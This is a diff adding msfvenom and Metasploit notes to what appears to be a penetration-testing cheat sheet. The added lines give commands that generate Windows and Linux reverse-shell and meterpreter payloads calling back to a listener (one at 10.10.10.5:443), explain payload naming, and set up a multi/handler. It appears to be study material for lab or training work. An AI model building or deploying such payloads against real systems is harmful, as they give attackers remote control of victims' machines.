@@ -971,3 +971,27 @@ reverse power shell on Windows:
 - PayloadsAllTheThings
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
+**msfvenom**
+standard 
+- ``` msfvenom -p <PAYLOAD> <OPTIONS> ```
+
+Windows x64 Reverse Shell
+- ```` msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> ```
+- -f: format
+- -o: output
+
+staged meterpreter reverse shell for a 64bit Linux target
+- ``` msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443 ```
+
+Payload Naming Conventions
+- OS/arch/payload
+- eg. linux/x86/shell_reverse_tcp
+- eg. ``` windows/x64/meterpreter/reverse_tcp ``` staged payload
+- eg. ``` linux/x86/meterpreter_reverse_tcp ``` stageless payload
+
+list payloads:
+- ``` msfvenom --list payloads | grep "linux/x86/meterpreter" ```
+
+**Metasploit multi/handler**
+- 3 options:  payload, LHOST and LPORT.
+- ``` exploit -j ``` run in background.
